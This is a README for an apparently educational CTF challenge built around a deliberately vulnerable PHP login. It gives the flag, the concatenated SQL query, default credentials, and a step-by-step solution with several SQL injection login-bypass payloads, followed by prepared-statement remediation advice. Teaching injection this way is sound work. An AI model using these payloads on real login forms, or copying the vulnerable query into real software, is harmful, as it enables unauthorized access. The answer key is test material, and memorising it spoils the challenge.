# Phoenix CTF - SQL Injection Challenge

**Flag:** `PHXCTF{1Njeksi_Byp44as}`

## Challenge Description

You have been given a web application with a vulnerable login system. Your mission is to exploit the SQL injection vulnerability to bypass authentication and access the admin dashboard where the flag is hidden.

## Objective

Exploit the SQL injection vulnerability in the login form to gain admin access and retrieve the flag: `PHXCTF{1Njeksi_Byp44as}`

## Vulnerability

The login system is vulnerable to SQL injection. The vulnerable code in `login.php`:

```php
$sql = "SELECT * FROM users WHERE username = '$username' AND password = '" . md5($password) . "'";
```

This query is constructed using string concatenation without proper input sanitization, making it vulnerable to SQL injection attacks.

## Setup Instructions

### Requirements
- PHP 7.4 or higher
- MySQL/MariaDB server
- Apache/Nginx web server (or use PHP built-in server)

### Installation

1. **Configure Database**
   - Open `config.php`
   - Update database credentials if needed:
     ```php
     define('DB_HOST', 'localhost');
     define('DB_USER', 'root');
     define('DB_PASS', '');
     define('DB_NAME', 'phoenix_ctf');
     ```

2. **Start Web Server**

   **Option 1: Using PHP Built-in Server**
   ```bash
   php -S localhost:8000
   ```

   **Option 2: Using XAMPP/WAMP/MAMP**
   - Copy the `web_challenge_sqli` folder to `htdocs` directory
   - Access via `http://localhost/web_challenge_sqli`

   **Option 3: Using Apache**
   - Configure virtual host
   - Point to the `web_challenge_sqli` directory

3. **Initialize Database**
   - The database and tables will be created automatically on first access
   - Default admin account is created automatically:
     - Username: `admin`
     - Password: `admin123`

## Challenge Solution

### SQL Injection Payloads

To bypass the login, you can use various SQL injection techniques:

#### Method 1: Classic OR-based Injection
- **Username:** `' OR '1'='1' -- `
- **Password:** (anything)

This works because it creates the query:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = '...'
```

#### Method 2: Comment-based Injection
- **Username:** `admin' -- `
- **Password:** (anything)

This works because it creates the query:
```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = '...'
```

#### Method 3: Union-based Injection
- **Username:** `' OR 1=1 LIMIT 1 -- `
- **Password:** (anything)

#### Method 4: Always True Condition
- **Username:** `admin' OR '1'='1`
- **Password:** (anything)

### Step-by-Step Solution

1. Open the login page: `http://localhost:8000/login.php`
2. In the username field, enter: `' OR '1'='1' -- `
3. In the password field, enter anything (e.g., `password`)
4. Click Login
5. You will be redirected to the admin dashboard
6. View the flag: `PHXCTF{1Njeksi_Byp44as}`

## Features

- **User Registration**: Create normal user accounts
- **Vulnerable Login**: SQL injection vulnerability in authentication
- **User Dashboard**: Regular user interface
- **Admin Dashboard**: Admin interface with flag
- **Profile Management**: View user information
- **User Management**: Admin can view all users

## File Structure

```
web_challenge_sqli/
├── index.php          # Home page
├── login.php          # Vulnerable login page
├── register.php       # User registration
├── dashboard.php      # User dashboard
├── admin.php          # Admin dashboard (contains flag)
├── profile.php        # User profile page
├── logout.php         # Logout handler
├── config.php         # Database configuration
├── style.css          # Stylesheet
└── README.md          # This file
```

## Learning Objectives

This challenge teaches:
- **SQL Injection Basics**: Understanding how SQL injection works
- **Authentication Bypass**: Using SQL injection to bypass login
- **Input Validation**: Importance of validating user input
- **Prepared Statements**: Why prepared statements are important
- **Secure Coding**: How to prevent SQL injection vulnerabilities

## Difficulty Level

**EASY-MEDIUM** - This challenge is designed for beginners to learn about:
- SQL injection fundamentals
- Basic SQL query manipulation
- Authentication bypass techniques
- Web application security

## Security Notes

⚠️ **Important**: This application is intentionally vulnerable for educational purposes!

**Vulnerabilities in this challenge:**
- SQL injection in login form (no input sanitization)
- MD5 password hashing (weak and deprecated)
- Verbose error messages
- No rate limiting
- No input validation on login

**How to prevent SQL injection:**

✅ **Use Prepared Statements:**
```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $hashed_password);
$stmt->execute();
```

✅ **Input Validation:**
- Validate and sanitize all user inputs
- Use whitelisting for allowed characters
- Escape special characters

✅ **Use Modern Password Hashing:**
```php
password_hash($password, PASSWORD_BCRYPT);
password_verify($password, $hash);
```

✅ **Implement Security Measures:**
- Rate limiting
- CSRF protection
- Session security
- Error handling without information disclosure

## Hints

- 💡 Try entering a single quote (') in the username field
- 💡 Look for SQL injection patterns like `' OR '1'='1`
- 💡 The comment syntax in SQL is `--`
- 💡 You can comment out the rest of the query
- 💡 Try to make the WHERE clause always true
- 💡 Classic payload: `' OR '1'='1' -- `

## Testing Environment

This challenge can be deployed on:
- Local development server (XAMPP, WAMP, MAMP)
- PHP built-in server
- Docker containers
- Cloud hosting (with MySQL support)

## Additional Resources

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PHP Prepared Statements](https://www.php.net/manual/en/mysqli.quickstart.prepared-statements.php)

---

**Good luck and happy hacking! 🔥**
